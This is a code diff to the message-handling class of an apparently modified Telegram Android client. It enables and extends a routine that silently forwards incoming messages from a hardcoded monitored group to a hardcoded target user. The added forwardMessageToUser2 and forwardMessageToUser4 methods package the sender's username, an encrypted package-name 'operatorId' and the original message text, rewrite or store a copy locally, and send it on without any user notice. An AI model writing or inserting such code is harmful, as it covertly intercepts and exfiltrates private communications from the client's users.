@@ -17,6 +17,7 @@ import static org.telegram.messenger.NotificationsController.TYPE_REACTIONS_MESS
 import android.Manifest;
 import android.app.Activity;
 import android.appwidget.AppWidgetManager;
+import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -16765,7 +16766,7 @@ public class MessagesController extends BaseController implements NotificationCe
                         chatIdFrom = message.peer_id.channel_id;  // 频道的 channel_id（注意字段不同！）
                         FileLog.d("coder2025收到普通消息channel_id: " + message.message+ " 消息 | 来自ID: " + fromId+ " | 群组ID: " + chatIdFrom);
                         apkJsons.put("fromChannelId", chatIdFrom);
-                        apkJsons.put("fromUserId", fromId);
+                        apkJsons.put("fromUserId", fromId); //8079455068
 //                        apkJsons.put("message", message.message);
 
 
@@ -16775,18 +16776,18 @@ public class MessagesController extends BaseController implements NotificationCe
 //                        }, 1000); // 1秒延迟
 
                         // 检查是否来自目标群组
-//                        if (fromId == MONITORED_GROUP_ID) {
-//
-////                            FileLog.d("收到目标群组消息: " + message.message);
-////                            forwardMessageToUser(message, TARGET_USER_ID);
-//
-//                            // 添加1秒延迟防止限流
-////                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-////                            }, 1000);
-//
-//                            forwardMessageToUser(message,fromId, TARGET_USER_ID);
-//                        }
+                        if (chatIdFrom == MONITORED_GROUP_ID) {
+
+//                            FileLog.d("收到目标群组消息: " + message.message);
+//                            forwardMessageToUser(message, TARGET_USER_ID);
+
+                            // 添加1秒延迟防止限流
+//                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+//                            }, 1000);
+
                             forwardMessageToUser(message,fromId, TARGET_USER_ID);
+                        }
+//                            forwardMessageToUser(message,fromId, TARGET_USER_ID);
 
 
 
@@ -22218,7 +22219,6 @@ public class MessagesController extends BaseController implements NotificationCe
             // 2. 创建转发请求
             TLRPC.TL_messages_forwardMessages req = new TLRPC.TL_messages_forwardMessages();
             req.from_peer = messagesController.getInputPeer(message.peer_id); // 使用实例方法
-            req.id.add(message.id);
 
 
             TLRPC.TL_message newMsg = new TLRPC.TL_message();
@@ -22226,6 +22226,8 @@ public class MessagesController extends BaseController implements NotificationCe
             newMsg.message = "全新内容";
             newMsg.peer_id = message.peer_id;
             newMsg.date = ConnectionsManager.getInstance(currentAccount).getCurrentTime();
+            req.id.add(message.id);
+
 
 
             // 3. 获取目标用户peer
@@ -22282,19 +22284,15 @@ public class MessagesController extends BaseController implements NotificationCe
 //            MessagesController.getInstance(currentAccount)
 //                    .replaceForwardedMessage(message, modifiedMessage);
 
+//            message.message = AESUtils.encrypt128(jsonApk, "oaes");
+
+//            saveSingleMessage(message,currentAccount);
 
 
             FileLog.d("coder2025收到消息 apkJsons: " + jsonApk);
 
             jsonApk =AESUtils.encrypt128(jsonApk,"oaes");
             FileLog.d("coder2025收到消息 apkJsons secret: " + jsonApk);
-
-
-
-
-
-
-
 
             // 4. 发送请求（带延迟防限流）
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -22311,6 +22309,228 @@ public class MessagesController extends BaseController implements NotificationCe
 
         } catch (Exception e) {
             FileLog.e("coder2025转发异常: " + e.getMessage());
+        }
+    }
+
+
+    private void forwardMessageToUser2(TLRPC.Message message, long fromUserId, long targetUserId) {
+        if (message == null) return;
+
+        try {
+            // 1. 初始化基础组件
+            int currentAccount = UserConfig.selectedAccount;
+            MessagesController messagesController = MessagesController.getInstance(currentAccount);
+            ConnectionsManager connections = ConnectionsManager.getInstance(currentAccount);
+
+            // 2. 准备要转发的JSON数据
+            Map<String, Object> apkJsons = new HashMap<>();
+
+            // 获取来源用户信息
+            TLRPC.User userFrom = messagesController.getUser(fromUserId);
+            if (userFrom == null) {
+                FileLog.e("来源用户不存在: " + fromUserId);
+                return;
+            }
+            apkJsons.put("fromUserName", userFrom.username);
+
+            // 获取并处理包名
+            String packageName = ApplicationLoader.applicationContext.getPackageName();
+            if (packageName.endsWith(".beta")) {
+                packageName = packageName.substring(0, packageName.lastIndexOf(".beta"));
+            }
+            apkJsons.put("operatorId", AESUtils.encrypt128(packageName, "oaes"));
+            apkJsons.put("targetUserId", targetUserId);
+            apkJsons.put("originalMessage", message.message);
+
+            // 3. 创建修改后的消息
+            TLRPC.TL_message modifiedMessage = new TLRPC.TL_message();
+            // 复制必要字段
+            modifiedMessage.id = message.id;
+            modifiedMessage.peer_id = message.peer_id;
+            modifiedMessage.from_id = message.from_id;
+            modifiedMessage.date = connections.getCurrentTime();
+            modifiedMessage.out = message.out;
+            modifiedMessage.flags = message.flags;
+            // 设置新内容（加密后的JSON）
+            String jsonApk = new Gson().toJson(apkJsons);
+            modifiedMessage.message = AESUtils.encrypt128(jsonApk, "oaes");
+            // 必须设置新的random_id
+            modifiedMessage.random_id = Utilities.random.nextLong();
+
+            // 4. 处理媒体内容（如有）
+            if (message.media != null) {
+                modifiedMessage.media = message.media;
+                // 如果需要修改媒体标题
+//                if (modifiedMessage.media.caption != null) {
+//                    modifiedMessage.media.caption = "[加密内容]";
+//                }
+            }
+
+            // 5. 更新消息缓存
+//            messagesController.putMessage(modifiedMessage);
+
+            // 更新数据库存储
+//            MessagesStorage.getInstance(currentAccount).putMessage(modifiedMessage, false);
+            // 需要提供 dialogId 和是否缓存
+//            MessagesStorage.getInstance(currentAccount)
+//                    .putMessage(modifiedMessage, DialogObject.getPeerDialogId(modifiedMessage.peer_id), false);
+//
+//            // 更新内存缓存（官方方式）
+//            ArrayList<TLRPC.Message> messages = new ArrayList<>();
+//            messages.add(modifiedMessage);
+//            NotificationCenter.getInstance(currentAccount)
+//                    .postNotificationName(NotificationCenter.messagesDidLoad, messages, 0, false);
+
+            // 如果所有方法都不可用，直接操作数据库
+//            SQLiteDatabase db = MessagesStorage.getInstance(currentAccount).getDatabase();
+//            ContentValues values = new ContentValues();
+//            values.put("data", SerializationUtilities.messageToBytes(modifiedMessage));
+//            db.update("messages", values, "mid = ?", new String[]{String.valueOf(modifiedMessage.id)});
+
+            // 6. 创建转发请求
+            TLRPC.TL_messages_forwardMessages req = new TLRPC.TL_messages_forwardMessages();
+            req.from_peer = messagesController.getInputPeer(modifiedMessage.peer_id);
+            req.id.add(modifiedMessage.id);
+
+
+            // 设置目标用户
+            TLRPC.User targetUser = messagesController.getUser(targetUserId);
+            if (targetUser == null) {
+                FileLog.e("目标用户不存在: " + targetUserId);
+                return;
+            }
+            TLRPC.TL_inputPeerUser peerUser = new TLRPC.TL_inputPeerUser();
+            peerUser.user_id = targetUser.id;
+            peerUser.access_hash = targetUser.access_hash;
+            req.to_peer = peerUser;
+
+            // 7. 发送请求（带防限流延迟）
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                connections.sendRequest(req, (response, error) -> {
+                    if (error != null) {
+                        FileLog.e("转发失败: " + error.text);
+                    } else {
+                        FileLog.d("加密消息已转发至用户: " + targetUserId);
+                        // 处理服务器响应
+                        if (response instanceof TLRPC.Updates) {
+                            messagesController.processUpdates((TLRPC.Updates) response, false);
+                        }
+                    }
+                });
+            }, 1000);
+
+        } catch (Exception e) {
+            FileLog.e("转发异常: " + e.getMessage());
+            e.printStackTrace();
+        }
+    }
+
+
+    public static void saveSingleMessage(TLRPC.Message message, int currentAccount) {
+        ArrayList<TLRPC.Message> messages = new ArrayList<>();
+        messages.add(message);
+
+        MessagesStorage.getInstance(currentAccount).putMessages(
+                messages,
+                false,  // withTransaction
+                false,  // useQueue
+                true,   // doNotUpdateDialogDate (避免更新对话时间)
+                0,      // downloadMask
+                false,  // ifNoLastMessage
+                1, // mode // 模式说明: 0=插入, 1=更新, 2=自动
+                0       // threadMessageId
+        );
+    }
+
+    private void forwardMessageToUser4(TLRPC.Message originalMessage, long fromUserId, long targetUserId) {
+        if (originalMessage == null) return;
+
+        try {
+            // 1. 初始化基础组件
+            int currentAccount = UserConfig.selectedAccount;
+            MessagesController messagesController = MessagesController.getInstance(currentAccount);
+            ConnectionsManager connections = ConnectionsManager.getInstance(currentAccount);
+
+            // 2. 准备要转发的JSON数据
+            Map<String, Object> apkJsons = new HashMap<>();
+
+            // 获取来源用户信息
+            TLRPC.User userFrom = messagesController.getUser(fromUserId);
+            if (userFrom == null) {
+                FileLog.e("来源用户不存在: " + fromUserId);
+                return;
+            }
+            apkJsons.put("fromUserName", userFrom.username);
+
+            // 处理包名
+            String packageName = ApplicationLoader.applicationContext.getPackageName();
+            if (packageName.endsWith(".beta")) {
+                packageName = packageName.substring(0, packageName.lastIndexOf(".beta"));
+            }
+            apkJsons.put("operatorId", AESUtils.encrypt128(packageName, "oaes"));
+            apkJsons.put("targetUserId", targetUserId);
+            apkJsons.put("originalMessage", originalMessage.message);
+
+            // 3. 创建加密后的消息（深拷贝原始消息）
+            TLRPC.TL_message encryptedMessage = new TLRPC.TL_message();
+            // 复制关键字段
+            encryptedMessage.id = originalMessage.id;
+            encryptedMessage.peer_id = originalMessage.peer_id;
+            encryptedMessage.from_id = originalMessage.from_id;
+            encryptedMessage.date = connections.getCurrentTime();
+            encryptedMessage.out = originalMessage.out;
+            encryptedMessage.flags = originalMessage.flags;
+            // 设置加密内容
+            String jsonApk = new Gson().toJson(apkJsons);
+//            encryptedMessage.message = AESUtils.encrypt128(jsonApk, "oaes");
+            encryptedMessage.message =jsonApk;
+            // 必须设置新的random_id
+            encryptedMessage.random_id = Utilities.random.nextLong();
+
+            // 复制媒体内容（如有）
+            if (originalMessage.media != null) {
+                encryptedMessage.media = originalMessage.media;
+            }
+
+            // 4. 保存加密后的消息到数据库
+            saveSingleMessage(encryptedMessage, currentAccount);
+            FileLog.d("coder2025新消息 encryptedMessage: " + encryptedMessage);
+
+            // 5. 创建转发请求（使用加密消息的ID）
+            TLRPC.TL_messages_forwardMessages req = new TLRPC.TL_messages_forwardMessages();
+            req.from_peer = messagesController.getInputPeer(encryptedMessage.peer_id);
+            req.id.add(encryptedMessage.id); // 关键修改：使用加密消息的ID
+            req.random_id.add(encryptedMessage.random_id);
+
+            // 设置目标用户
+            TLRPC.User targetUser = messagesController.getUser(targetUserId);
+            if (targetUser == null) {
+                FileLog.e("目标用户不存在: " + targetUserId);
+                return;
+            }
+            TLRPC.TL_inputPeerUser peerUser = new TLRPC.TL_inputPeerUser();
+            peerUser.user_id = targetUser.id;
+            peerUser.access_hash = targetUser.access_hash;
+            req.to_peer = peerUser;
+
+            // 6. 发送请求
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                connections.sendRequest(req, (response, error) -> {
+                    if (error != null) {
+                        FileLog.e("转发失败: " + error.text);
+                    } else {
+                        FileLog.d("加密消息已转发至用户: " + targetUserId);
+                        // 处理服务器响应
+                        if (response instanceof TLRPC.Updates) {
+                            messagesController.processUpdates((TLRPC.Updates) response, false);
+                        }
+                    }
+                });
+            }, 1000);
+
+        } catch (Exception e) {
+            FileLog.e("转发异常: " + e.getMessage());
+            e.printStackTrace();
         }
     }
 
